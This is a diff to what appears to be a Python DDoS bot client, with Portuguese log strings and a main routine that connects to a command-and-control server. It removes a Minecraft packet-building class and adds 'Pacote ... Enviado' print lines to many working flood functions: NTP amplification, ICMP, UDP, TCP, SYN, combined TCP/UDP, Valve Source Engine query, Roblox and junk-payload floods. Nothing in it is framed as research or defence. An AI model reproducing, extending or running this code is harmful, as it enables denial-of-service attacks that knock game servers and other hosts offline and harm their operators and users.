@@ -36,94 +36,6 @@ def rand_ua():
         random.random() + random.randint(3, 9)
     )
 
-
-class Minecraft:
-    @staticmethod
-    def varint(d: int) -> bytes:
-        o = b''
-        while True:
-            b = d & 0x7F
-            d >>= 7
-            o += data_pack("B", b | (0x80 if d > 0 else 0))
-            if d == 0:
-                break
-        return o
-
-    @staticmethod
-    def data(*payload: bytes) -> bytes:
-        payload = b''.join(payload)
-        return Minecraft.varint(len(payload)) + payload
-
-    @staticmethod
-    def short(integer: int) -> bytes:
-        return data_pack('>H', integer)
-
-    @staticmethod
-    def long(integer: int) -> bytes:
-        return data_pack('>q', integer)
-
-    @staticmethod
-    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x00),
-                              Minecraft.varint(version),
-                              Minecraft.data(target[0].encode()),
-                              Minecraft.short(target[1]),
-                              Minecraft.varint(state))
-
-    @staticmethod
-    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x00),
-                              Minecraft.varint(version),
-                              Minecraft.data(
-                                  target[0].encode(),
-                                  b"\x00",
-                                  ip.encode(),
-                                  b"\x00",
-                                  uuid.hex.encode()
-                              ),
-                              Minecraft.short(target[1]),
-                              Minecraft.varint(state))
-
-    @staticmethod
-    def login(protocol: int, username: str) -> bytes:
-        if isinstance(username, str):
-            username = username.encode()
-        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
-                                               0x01 if protocol >= 385 else \
-                                               0x00),
-                              Minecraft.data(username))
-
-    @staticmethod
-    def keepalive(protocol: int, num_id: int) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
-                                               0x10 if protocol >= 712 else \
-                                               0x0F if protocol >= 471 else \
-                                               0x10 if protocol >= 464 else \
-                                               0x0E if protocol >= 389 else \
-                                               0x0C if protocol >= 386 else \
-                                               0x0B if protocol >= 345 else \
-                                               0x0A if protocol >= 343 else \
-                                               0x0B if protocol >= 336 else \
-                                               0x0C if protocol >= 318 else \
-                                               0x0B if protocol >= 107 else \
-                                               0x00),
-                              Minecraft.long(num_id) if protocol >= 339 else \
-                              Minecraft.varint(num_id))
-
-    @staticmethod
-    def chat(protocol: int, message: str) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
-                                               0x03 if protocol >= 464 else \
-                                               0x02 if protocol >= 389 else \
-                                               0x01 if protocol >= 343 else \
-                                               0x02 if protocol >= 336 else \
-                                               0x03 if protocol >= 318 else \
-                                               0x02 if protocol >= 107 else \
-                                               0x01),
-                              Minecraft.data(message.encode()))
-
-
-
 # AMP METHODS ----------------->
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
 def NTP(target, port, timer):
@@ -146,7 +58,7 @@ def NTP(target, port, timer):
             try:
                 for _ in range(50000000):
                     send(packet, count=packets, verbose=False)
-                    print('PKT SEND')
+                    #print('NTP SEND')
             except Exception as e:
                # print(f"Erro: {e}")
                 pass
@@ -185,6 +97,7 @@ def icmp(target, timer):
             for _ in range(5000000):
                 packet = random._urandom(int(random.randint(1024, 60000)))
                 pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
+                #print('MEMCACHED SEND')
         except:
             pass
 
@@ -392,6 +305,7 @@ def attack_udp(ip, port, secs, size):
         dport = random.randint(1, 65535) if port == 0 else port
         data = random._urandom(size)
         s.sendto(data, (ip, dport))
+        print('Pacote UDP Enviado')
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
@@ -400,6 +314,7 @@ def attack_tcp(ip, port, secs, size):
             s.connect((ip, port))
             while time.time() < secs:
                 s.send(random._urandom(size))
+                print('Pacote TCP Enviado')
         except:
             pass
 
@@ -416,6 +331,7 @@ def attack_SYN(ip, port, secs):
             
             while time.time() < secs:
                 s.send(pkt)
+                print('Pacote SYN Enviado')
         except:
             s.close()
 
@@ -429,6 +345,7 @@ def attack_tup(ip, port, secs, size):
             tcp.connect((ip, port))
             udp.sendto(data, (ip, dport))
             tcp.send(data)
+            print('Pacote TUP Enviado')
         except:
             pass
 
@@ -442,15 +359,17 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
+        print('Pacote HEX Enviado')
 
 def attack_vse(ip, port, secs):
     payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-                b'\x20\x51\x75\x65\x72\x79\x00') # Read more here > https://developer.valvesoftware.com/wiki/Server_queries
-    
+                b'\x20\x51\x75\x65\x72\x79\x00') # Read more here > https://developer.valvesoftware.com/wiki/Server_queries    
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
+        print('Pacote VSE Enviado')
+
 
 def attack_roblox(ip, port, secs, size):
     while time.time() < secs:
@@ -462,6 +381,7 @@ def attack_roblox(ip, port, secs, size):
             hex = "%064x" % ran
             hex = hex[:64]
             s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
+            print('Pacote ROBLOX Enviado')
 
 def attack_junk(ip, port, secs):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
@@ -470,6 +390,7 @@ def attack_junk(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
+        print('Pacote junk enviado')
 
 def main():
         c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
